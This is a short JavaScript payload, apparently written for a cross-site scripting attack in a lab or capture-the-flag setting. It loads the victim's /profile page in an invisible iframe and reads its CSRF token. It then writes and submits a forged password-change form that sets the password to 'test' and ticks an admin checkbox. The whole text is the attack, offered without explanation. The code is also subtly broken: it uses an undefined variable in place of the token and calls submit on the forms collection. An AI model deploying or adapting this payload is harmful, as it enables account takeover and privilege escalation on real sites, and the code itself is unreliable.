<script>
    document.writeln('<iframe id="iframe" src="/profile" width="0" height="0" onload="read()"></iframe>');

    function read()
    {
        var token = document.getElementById('iframe').contentDocument.getElementsByName('csrf_token')[0].value;

        document.writeln('<form action="" method="post" class="form" role="form"> <input id="csrf_token" name="csrf_token" type="hidden" value='+ value +'><div class="form-group  required"><label class="control-label" for="old_password">Old Password</label> <input class="form-control" id="old_password" name="old_password" required type="password" value="test"></div> <div class="form-group  required"><label class="control-label" for="new_password">New Password</label> <input class="form-control" id="new_password" name="new_password" required type="password" value="test"></div><div class="form-group "><label class="control-label" for="new_password_confirm">Confirm New Password</label><input class="form-control" id="new_password_confirm" name="new_password_confirm" type="password" value="test"></div><div class="checkbox"><label><input id="is_admin" name="is_admin" type="checkbox" value="y" checked=true> Admin</label></div><input class="btn btn-default" id="submit" name="submit" type="submit" value="Update"> </form>');
        document.forms.submit();
    }
</script>